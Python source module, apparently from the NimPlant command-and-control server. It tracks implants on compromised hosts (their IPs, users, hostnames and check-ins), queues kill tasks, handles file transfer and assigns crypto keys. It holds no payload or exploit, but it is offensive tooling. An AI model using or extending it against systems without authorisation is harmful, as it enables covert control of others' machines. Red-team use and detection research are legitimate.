import datetime, itertools, random, string
from secrets import choice
from .config import config
from .func import *

# Parse configuration from 'config.toml'
try:
    sleepTimeSeconds = config['nimplant']['sleepTimeSeconds']
    killTimeHours    = config['nimplant']['killTimeHours']
except KeyError as e:
    nimplantPrint(f"ERROR: Could not load configuration, check your 'config.toml': {str(e)}")
    os._exit(1)

class NimPlantList:
    def __init__(self):
        self.nimplantList = []  # type: List[NimPlant]
        self.guid = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
        self.name = self.guid
        self.activeNimPlantGuid = None

    def set_name(self, name):
        if not name == "":
            self.name = name
        else:
            pass

    def add(self, np):
        self.nimplantList.append(np)

    def selectNimPlant(self, id, np):
        if len(id) == 8:
            # Select by GUID
            res = [np for np in self.nimplantList if np.guid == id]
        else:
            # Select by sequential ID
            res = [np for np in self.nimplantList if np.id == id]

        if res != [] and res[0].active == True:
            nimplantPrint(f"Starting interaction with NimPlant #{res[0].id}.", np.guid)
            self.activeNimPlantGuid = res[0].guid
        else:
            nimplantPrint("Invalid NimPlant ID.", np.guid)

    def selectNextActiveNimPlant(self):
        guid = [np for np in self.nimplantList if np.active == True][0].guid
        self.selectNimPlant(guid, self)

    def getActiveNimPlant(self):
        res = [np for np in self.nimplantList if np.guid == self.activeNimPlantGuid]
        if res != []:
            return res[0]
        else:
            return None

    def getNimPlantByGuid(self, guid):
        res = [np for np in self.nimplantList if np.guid == guid]
        if res != []:
            return res[0]
        else:
            return None

    def containsActiveNimPlants(self):
        for np in self.nimplantList:
            if np.active == True:
                return True
        return False

    def isActiveNimPlantSelected(self):
        if self.activeNimPlantGuid != None:
            return self.getActiveNimPlant().active
        else:
            return False

    def killAllNimPlants(self):
        for np in self.nimplantList:
            np.kill()

    def getInfo(self, npguid):
        result = "\n"
        result += "{:<4} {:<8} {:<15} {:<18} {:<15} {:<15} {:<10} {:<15}\n".format('ID', 'GUID', 'EXTERNAL IP',
                                                                                   'INTERNAL IP', 'USERNAME',
                                                                                   'HOSTNAME', 'PID', 'LAST CHECK-IN')
        for np in self.nimplantList:
            if np.active == True:
                result += "{:<4} {:<8} {:<15} {:<18} {:<15} {:<15} {:<10} {:<15}\n".format(np.id, np.guid, np.ipAddrExt,
                                                                                           np.ipAddrInt, np.username,
                                                                                           np.hostname, np.pid,
                                                                                           f"{np.lastCheckin} ({np.getLastCheckinSeconds()}s ago)")

        nimplantPrint(result.rstrip(), npguid)

    def get_info(self):
        npsInfo = []
        for np in self.nimplantList:
            npsInfo.append(np.get_info())

        return {"nimplants": npsInfo}


# Class to contain data and status about connected implant
class NimPlant:
    newId = itertools.count(start=1)

    def __init__(self):
        self.id = str(next(self.newId))
        self.guid = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
        self.active = False
        self.ipAddrExt = None
        self.ipAddrInt = None
        self.username = None
        self.hostname = None
        self.osBuild = None
        self.pid = None
        self.riskyMode = None
        self.sleepTimeSeconds = sleepTimeSeconds
        self.killTimeHours = killTimeHours
        self.firstCheckin = None
        self.lastCheckin = None
        self.task = None
        self.hostingFile = None
        self.receivingFile = None

        # Generate random, 16-char key for crypto operations
        self.cryptKey = ''.join(choice(string.ascii_letters + string.digits) for x in range(16))

    def activate(self, ipAddrExt, ipAddrInt, username, hostname, osBuild, pid, riskyMode):
        self.active = True
        self.ipAddrExt = ipAddrExt
        self.ipAddrInt = ipAddrInt
        self.username = username
        self.hostname = hostname
        self.osBuild = osBuild
        self.pid = pid
        self.riskyMode = riskyMode
        self.firstCheckin = timestamp()
        self.lastCheckin = timestamp()
        nimplantPrint(f"NimPlant #{self.id} ({self.guid}) checked in from {username}@{hostname} at '{ipAddrExt}'!")
        nimplantPrint(f"OS version is {osBuild}.")

    def checkIn(self):
        self.lastCheckin = timestamp()
        if self.task is not None:
            if self.task == "kill":
                self.active = False
                nimplantPrint(f"NimPlant #{self.id} killed.", self.guid)

    def getLastCheckinSeconds(self):
        lastCheckinDatetime = datetime.strptime(self.lastCheckin, timestampFormat)
        nowDatetime = datetime.strptime(timestamp(), timestampFormat)
        return (nowDatetime - lastCheckinDatetime).seconds

    def setResult(self, result):
        if result == "NIMPLANT_KILL_TIMER_EXPIRED":
            # Process NimPlant self destruct
            self.active = False
            nimplantPrint("NimPlant announced self-destruct (kill timer expired). RIP.", self.guid)
        else:
            # Print the result
            nimplantPrint(result, self.guid)

    def isActive(self):
        if not self.active:
            return False
        return self.active

    def kill(self):
        self.task = "kill"

    def getInfo(self):
        prettyPrint(vars(self), self.guid)

    def getTask(self):
        return self.task

    def setTask(self, task):
        self.task = task

    def resetTask(self):
        self.task = None

    def hostFile(self, file):
        self.hostingFile = file

    def stopHostingFile(self):
        self.hostingFile = None

    def receiveFile(self, file):
        self.receivingFile = file

    def stopReceivingFile(self):
        self.receivingFile = None

    def get_info(self):
        return {
            "id": self.id,
            "guid": self.guid,
            "active": self.active,
            "externalIp": self.ipAddrExt,
            "internalIp": self.ipAddrInt,
            "username": self.username,
            "hostname": self.hostname,
            "pid": self.pid,
            "lastCheckIn": self.lastCheckin,
            "osBuild": self.osBuild,
            "sleep": self.sleepTimeSeconds,
            "killAfter": self.killTimeHours,
            "firstCheckIn": self.firstCheckin,
            "task": self.task,
            "hostingFile": self.hostingFile,
            "cryptKey": self.cryptKey
        }


# Initialize global class to keep nimplant objects in
nps = NimPlantList()
